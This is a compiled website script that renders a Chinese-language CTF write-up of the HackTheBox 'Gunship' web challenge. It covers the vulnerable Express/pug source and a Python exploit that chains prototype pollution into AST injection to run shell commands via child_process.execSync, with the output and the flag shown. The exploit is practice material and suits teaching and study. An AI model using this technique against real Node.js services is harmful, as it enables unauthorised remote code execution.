"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[9006],{21676:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>a,default:()=>d,frontMatter:()=>i,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"HackTheBox/Challenges/Web/Gunship/index","title":"Gunship","description":"Difficulty: VERY EASY","source":"@site/docs/HackTheBox/Challenges/Web/Gunship/index.md","sourceDirName":"HackTheBox/Challenges/Web/Gunship","slug":"/HackTheBox/Challenges/Web/Gunship/","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Challenges/Web/Gunship/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Challenges/Web/Gunship/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackTheBox_Sidebar","previous":{"title":"Web","permalink":"/Target-Machines-WriteUp/docs/category/HackTheBox-Challenges-Web"},"next":{"title":"baby WAFfles order","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Challenges/Web/baby WAFfles order/"}}');var r=t(74848),o=t(28453);const i={},a="Gunship",l={},c=[];function p(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",header:"header",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,o.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"gunship",children:"Gunship"})}),"\n",(0,r.jsxs)(n.admonition,{title:"CHALLENGE DESCRIPTION",type:"note",children:[(0,r.jsx)(n.p,{children:"Difficulty: VERY EASY"}),(0,r.jsx)(n.p,{children:"A city of lights, with retrofuturistic 80s peoples, and coffee, and drinks from another world... all the wooing in the world to make you feel more lonely... this ride ends here, with a tribute page of the British synthwave band called Gunship. \ud83c\udfb6"}),(0,r.jsx)(n.p,{children:"\u4e00\u5ea7\u5149\u4e4b\u57ce\uff0c\u4f4f\u774080\u5e74\u4ee3\u590d\u53e4\u672a\u6765\u98ce\u7684\u4eba\u4eec\uff0c\u5496\u5561\u548c\u6765\u81ea\u5f02\u4e16\u754c\u7684\u996e\u54c1\u2026\u2026\u4e16\u95f4\u6240\u6709\u7684\u8bf1\u60d1\uff0c\u5374\u8ba9\u4f60\u611f\u5230\u66f4\u52a0\u5b64\u72ec\u2026\u2026\u8fd9\u6bb5\u65c5\u7a0b\u5728\u6b64\u7ed3\u675f\uff0c\u732e\u7ed9\u82f1\u56fd\u5408\u6210\u5668\u6d6a\u6f6e\u4e50\u961fGunship\u7684\u81f4\u656c\u9875\u9762\u3002\ud83c\udfb6"})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",metastring:'title="index.js"',children:"const express       = require('express');\nconst app           = express();\nconst routes        = require('./routes');\nconst path          = require('path');\n\napp.use(express.json());\napp.set('views','./views');\napp.use('/static', express.static(path.resolve('static')));\n\napp.use(routes);\n\napp.all('*', (req, res) => {\n    return res.status(404).send('404 page not found');\n});\n\napp.listen(1337, () => console.log('Listening on port 1337'));\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u9875\u9762\u5e95\u90e8\u53d1\u73b0\u4e00\u4e2a\u8f93\u5165\u6846"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:t(90904).A+"",width:"2560",height:"1371"})}),"\n",(0,r.jsx)(n.p,{children:"\u6839\u636e POST \u53d1\u9001\u7684\u8def\u7531\uff0c\u5b9a\u4f4d\u5230"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",metastring:'title="challenge\\routes\\index.js"',children:"const path              = require('path');\nconst express           = require('express');\nconst pug                = require('pug');\nconst {unflatten}     = require('flat');\nconst router            = express.Router();\n\nrouter.get('/', (req, res) => {\n    return res.sendFile(path.resolve('views/index.html'));\n});\n\nrouter.post('/api/submit', (req, res) => {\n    const {artist} = unflatten(req.body);\n\n    if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {\n        return res.json({\n            'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })\n        });\n    } else {\n        return res.json({\n            'response': 'Please provide us with the full name of an existing member.'\n        });\n    }\n});\n\nmodule.exports = router;\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u53c2\u8003\u4ee5\u4e0b\u4e24\u4e2a\u6587\u7ae0"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://rayepeng.medium.com/how-ast-injection-and-prototype-pollution-ignite-threats-abb165164a68",children:"How AST Injection and Prototype Pollution Ignite Threats | by rayepeng | Medium"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://xz.aliyun.com/t/12635?time__1311=mqmhDvqIx%2BOKDsD7GQ0%3DQoqWqGIxG%3D%2B5b4D&alichlgref=https%3A%2F%2Fwww.google.com%2F",children:"\u4e00\u6587\u5e26\u4f60\u7406\u89e3 AST Injection - \u5148\u77e5\u793e\u533a"})}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u7f16\u5199\u653b\u51fb exp"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'import requests\nimport base64\n\nTARGET_URL = "http://94.237.56.248:50213"\n\n\ncommand = "ls -lh"\n\nprint("Command: {}\\n".format(command))\n\nr = requests.post(\n    TARGET_URL + "/api/submit",\n    json={\n        "artist.name": "Haigh",\n        "__proto__.block": {\n            "type": "Text",\n            "line": "process.mainModule.require(\'child_process\').execSync(\'$({command} | base64 > /app/static/out)\')".format(command=command),\n        },\n    },\n)\n\nr = requests.get("http://94.237.56.248:50213/static/out").text\n\nprint(base64.b64decode(r).decode())\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u5bf9\u7f51\u7ad9\u8fdb\u884c\u4ea4\u4e92"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"Command: ls -lh\n\ntotal 56K\n-rw-r--r--    1 nobody   nobody        56 Aug 13  2021 flagpJtu8\n-rw-r--r--    1 nobody   nobody       441 Oct  9  2020 index.js\ndrwxr-xr-x   89 root     root        4.0K Aug 13  2021 node_modules\n-rw-r--r--    1 nobody   nobody       359 Oct  9  2020 package.json\ndrwxr-xr-x    2 nobody   nobody      4.0K Aug 13  2021 routes\ndrwxr-xr-x    1 nobody   nobody      4.0K Mar 11 11:25 static\ndrwxr-xr-x    2 nobody   nobody      4.0K Aug 13  2021 views\n-rw-r--r--    1 nobody   nobody     25.5K Oct  9  2020 yarn.lock\n\nCommand: cat flagpJtu8\n\nHTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="Flag"',children:"HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}\n"})})]})}function d(e={}){const{wrapper:n}={...(0,o.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(p,{...e})}):p(e)}},90904:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/image_20240357-185735-9d937e7f8710e6ecce72b05f0dff2cd0.png"},28453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>a});var s=t(96540);const r={},o=s.createContext(r);function i(e){const n=s.useContext(o);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:i(e.components),s.createElement(o.Provider,{value:n},e.children)}}}]);